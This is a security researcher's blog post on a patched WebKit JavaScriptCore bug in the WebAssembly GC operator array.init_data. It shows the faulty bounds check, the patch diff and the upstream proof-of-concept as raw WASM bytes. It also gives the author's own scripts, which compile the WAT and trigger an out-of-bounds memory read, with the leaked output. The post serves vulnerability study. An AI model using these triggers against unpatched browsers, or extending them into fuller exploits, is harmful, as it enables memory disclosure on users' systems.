---
layout: post
title: "[Bugs 284332] JSC: Incorrect bounds check in arrayInitData"
image: /img/webkit.svg
tags: [webkit,jsc,wasm]
---
* TOC
{:toc}

# Summary

While reviewing a WebKit commit, I came across an interesting bug [patch](https://github.com/WebKit/WebKit/commit/9cee5daeabd138d039806770b90907a6fff97cc3){:target="\_blank"}. It's a simple bug, but it was patched after two years. And, the test code in the commit tests with an already generated WASM(WebAssembly). However, the WAT(WebAssembly text format) before it becomes WASM cannot be compiled using [wat2wasm](https://github.com/WebAssembly/wabt){:target="\_blank"} from WABT. This article covers how to compile and execute such WAT.  

# Bug

commit : 9cee5daeabd138d039806770b90907a6fff97cc3

## What is array.init_data ?

`array.init_data` is a new operator related to WASM GC(Garbage Collection) features. It is used to initialize a WASM array type using a data segment.  

Proposals:
- [https://github.com/WebAssembly/gc/blob/main/proposals/gc/MVP.md](https://github.com/WebAssembly/gc/blob/main/proposals/gc/MVP.md){:target="\_blank"}
- [https://github.com/WebAssembly/gc/blob/main/proposals/gc/Post-MVP.md](https://github.com/WebAssembly/gc/blob/main/proposals/gc/Post-MVP.md){:target="\_blank"}

Parameters:
0. The array to be initialized
1. The starting position in the array where copying begins
2. The starting position in the data segment where copying begins
3. The number of array slots to copy

Since it is a relatively new feature, it may not yet be supported by existing WASM toolchains.

## Root Cause

```cpp
// Source/JavaScriptCore/wasm/WasmOperationsInlines.h
inline bool arrayInitData(JSWebAssemblyInstance* instance, EncodedJSValue dst, uint32_t dstOffset, uint32_t srcDataIndex, uint32_t srcOffset, uint32_t size)
{
    JSValue dstRef = JSValue::decode(dst);
    ASSERT(dstRef.isObject());
    JSWebAssemblyArray* dstObject = jsCast<JSWebAssemblyArray*>(dstRef.getObject());

    CheckedUint32 lastDstElementIndexChecked = dstOffset;
    lastDstElementIndexChecked += size;

    if (lastDstElementIndexChecked.hasOverflowed())
        return false;

    if (lastDstElementIndexChecked > dstObject->size())
        return false;

    CheckedUint32 lastSrcElementIndexChecked = srcOffset;
    lastSrcElementIndexChecked += size;

    if (lastSrcElementIndexChecked.hasOverflowed())         // incorrect bounds check
        return false;

    size_t elementSize = dstObject->elementType().type.elementSize();
    return instance->copyDataSegment(dstObject, srcDataIndex, srcOffset, size * elementSize, dstObject->data() + dstOffset * elementSize);
}
```
In `lastSrcElementIndexChecked`, it checks for a Uint32 overflow when adding `size` to the `srcOffset`, where srcOffset is source offset and size is number of array elements. In other words, it checks whether an overflow occurs when adding the number of elements to the source offset.  

However, since copyDataSegment(..) copies `size * elementSize` elements from the srcOffset, it is correct to perform an overflow check for `srcOffset + size * elementSize`.  

## Patch

```diff
inline bool arrayInitData(JSWebAssemblyInstance* instance, EncodedJSValue dst, uint32_t dstOffset, uint32_t srcDataIndex, uint32_t srcOffset, uint32_t size)
{
    JSValue dstRef = JSValue::decode(dst);
    ASSERT(dstRef.isObject());
    JSWebAssemblyArray* dstObject = jsCast<JSWebAssemblyArray*>(dstRef.getObject());

    CheckedUint32 lastDstElementIndexChecked = dstOffset;
    lastDstElementIndexChecked += size;

    if (lastDstElementIndexChecked.hasOverflowed())
        return false;

    if (lastDstElementIndexChecked > dstObject->size())
        return false;

-    CheckedUint32 lastSrcElementIndexChecked = srcOffset;
+    size_t elementSize = dstObject->elementType().type.elementSize();
-    lastSrcElementIndexChecked += size;

-    if (lastSrcElementIndexChecked.hasOverflowed())
+    CheckedUint32 lastSrcByteChecked = size;
+    lastSrcByteChecked *= elementSize;
+    lastSrcByteChecked += srcOffset;
+    if (lastSrcByteChecked.hasOverflowed())
        return false;

-    size_t elementSize = dstObject->elementType().type.elementSize();
    return instance->copyDataSegment(dstObject, srcDataIndex, srcOffset, size * elementSize, dstObject->data() + dstOffset * elementSize);
}
```

## PoC

The commit includes code for testing.
```js
/*
(module
  (memory (export "memory") 1)
  (type $vec (array (mut i32)))
  (data $data0 "1234")
  (func $main(result (ref null $vec))
    (local $arr(ref null $vec))
    (local.set $arr (array.new_default $vec (i32.const 4)))
    (array.init_data $vec $data0
      (local.get $arr)
      (i32.const 0)
      (i32.const -2)
      (i32.const 1))
    (local.get $arr)
  )
  (export "main" (func $main))
)
 */
var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x89,0x80,0x80,0x80,0x00,0x02,0x5e,0x7f,0x01,0x60,0x00,0x01,0x63,0x00,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x01,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0c,0x81,0x80,0x80,0x80,0x00,0x01,0x0a,0xa0,0x80,0x80,0x80,0x00,0x01,0x9a,0x80,0x80,0x80,0x00,0x01,0x01,0x63,0x00,0x41,0x04,0xfb,0x07,0x00,0x21,0x00,0x20,0x00,0x41,0x00,0x41,0x7e,0x41,0x01,0xfb,0x12,0x00,0x00,0x20,0x00,0x0b,0x0b,0x87,0x80,0x80,0x80,0x00,0x01,0x01,0x04,0x31,0x32,0x33,0x34]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var f = wasm_instance.exports.main;
try {
    f();
} catch {
}
```

This is the code where `arrayInitData(..)` is called with `srcOffset = -2` and `size = 1`. The calculation `0xfffffffe + 0x1 = 0xffffffff` does not cause a Uint32 overflow, so it passes the `lastSrcElementIndexChecked.hasOverflowed()` check.  

The check for `srcOffset` is performed in the `copyDataSegment(..)` function.

```cpp
bool JSWebAssemblyInstance::copyDataSegment(JSWebAssemblyArray* array, uint32_t segmentIndex, uint32_t offset, uint32_t lengthInBytes, uint8_t* values)
{
    // Fail if the data segment index is out of bounds
    RELEASE_ASSERT(segmentIndex < module().moduleInformation().dataSegmentsCount());
    // Otherwise, get the `segmentIndex`th data segment
    const Segment::Ptr& segment = module().moduleInformation().data[segmentIndex];
    const uint32_t segmentSizeInBytes = m_passiveDataSegments.quickGet(segmentIndex) ? segment->sizeInBytes : 0U;

    // Caller checks that the (offset + lengthInBytes) calculation doesn't overflow
    if ((offset + lengthInBytes) > segmentSizeInBytes) {    // [1]
        // The segment access would overflow; the caller must handle this error.
        return false;
    }
    // If size is 0, do nothing
    if (!lengthInBytes)
        return true;
    // Cast the data segment to a pointer
    const uint8_t* segmentData = &segment->byte(offset);    // [2]

    // Copy the data from the segment into the out param vector
    if (array->elementsAreRefTypes()) {
        gcSafeMemcpy(std::bit_cast<uint64_t*>(values), std::bit_cast<const uint64_t*>(segmentData), lengthInBytes);
        m_vm->writeBarrier(array);
    } else
        memcpy(values, segmentData, lengthInBytes);         // [3]

    return true;
}
```
[1]  
It checks whether `offset + lengthInBytes` exceeds the source array's size, `segmentSizeInBytes`. Since `lengthInBytes` is calculated as `size * elementSize`, it equals 1 * 4, which is 4. The calculation `0xfffffffe + 0x4` results in an overflow, wrapping around to 0x2, so it does not exceed `segmentSizeInBytes`.  

[2]  
It uses an offset larger than what is actually available to calculate the `segmentData` pointer.  

[3]  
It copies 4 bytes from the OOB(out-of-bounds) pointer to the destination array.  


# Let's Try

When the PoC was executed, it immediately triggered the bug. This code uses an already compiled WASM, but when attempting to compile the WAT (as described in the comments in the PoC) using wat2wasm, the syntax is not recognized correctly.  

Since `array.init_data` is a relatively new WebAssembly GC feature, wat2wasm may not yet support it. Instead, it seems that WebKit's internal testing tools provide a custom WebAssemblyText encoder.  

You can find the relevant files in the `JSTests/` directory. Create a new directory called ex.`wasm_test/` and copy the `wast.js` and `wast-wrapper.js` files from the `JSTests/wasm/gc/` directory into it.  

```
$ cd WebKit
$ mkdir wasm_test
$ cp JSTests/wasm/gc/wast-wrapper.js wasm_test/
$ cp JSTests/wasm/gc/wast.js wasm_test/
```

The `wast.js` file is responsible for parsing and compiling the WAT. The `wast-wrapper.js` contains wrapper functions, such as `compile` and `instantiate`. To obtain the compiled WASM, I added a print code.  

```js
// my wasm_test/wast-wrapper.js
import "./wast.js";

export function compile(wat) {
    const binary = WebAssemblyText.encode(wat);

    print(`[${new Uint8Array(binary)}]`);

    return new WebAssembly.Module(binary);
}

export function instantiate(wat, imports = {}) {
    const module = compile(wat);
    return new WebAssembly.Instance(module, imports);
}
```

Then, I created `genWasm.js` and wrote the following code.
```js
import { compile, instantiate } from "./wast-wrapper.js";

function genWasm() {
  var wasm_module = compile(`
    (module
      (memory (export "memory") 1)
      (type $vec (array (mut i32)))
      (data $data0 "1234")
      (func $main(result (ref null $vec))
        (local $arr(ref null $vec))
        (local.set $arr (array.new_default $vec (i32.const 4)))
        (array.init_data $vec $data0
          (local.get $arr)
          (i32.const 0)
          (i32.const -2)
          (i32.const 1))
        (local.get $arr)
      )
      (export "main" (func $main))
    )
`);
}

genWasm();
```

When the `compile` function is called, the compiled WASM bytes is output.

```
$ ./WebKitBuild/Release/jsc -m ./wasm_test/genWasm.js
[0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,94,127,1,96,0,1,99,0,3,130,128,128,128,0,1,1,5,131,128,128,128,0,1,0,1,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,12,129,128,128,128,0,1,10,160,128,128,128,0,1,154,128,128,128,0,1,1,99,0,65,4,251,7,0,33,0,32,0,65,0,65,126,65,1,251,18,0,0,32,0,11,11,135,128,128,128,0,1,1,4,49,50,51,52]
```

When the vulnerability is triggered, data is copied from the OOB pointer. The following code is for getting the results of the OOB read.
```js
import { compile, instantiate } from "./wast-wrapper.js";

function getOOB() {
    var instance = instantiate(`
    (module
        (memory (export "memory") 1)
        (type $vec (array (mut i32)))
        (data $data0 "1234")
        (func (export "main") (param $arr (ref null $vec)) (result (ref null $vec))
        (local.set $arr (array.new_default $vec (i32.const 4)))
        (array.init_data $vec $data0
            (local.get $arr)
            (i32.const 0)
            (i32.const -2)
            (i32.const 1))
        (local.get $arr)
        )
        (func (export "array_array_default") (param $n i32) (result (ref $vec))
            (array.new_default $vec (local.get $n))
        )
        (func (export "array_get") (param $arr (ref $vec)) (param $i i32) (result i32)
        (array.get $vec (local.get $arr) (local.get $i))
        )
    )
    `);

    let arr = instance.exports.array_array_default(0);
    let resultArr = instance.exports.main(arr);
    print(instance.exports.array_get(resultArr, 0));
}

getOOB();
```

In a normal case, the value `875770417 (0x34333231)`, corresponding to '1234', should be copied. However, when an OOB read occurs, it outputs a different value each time it is executed.
```
$ ./WebKitBuild/Release/jsc -m ./wasm_test/getOOB.js
1415000910
```

These may not be impressive, but they could be useful for testing other WASM in the future. I’ve also uploaded them to my [GitHub](https://github.com/rls1004/wasm_test){:target="\_blank"}.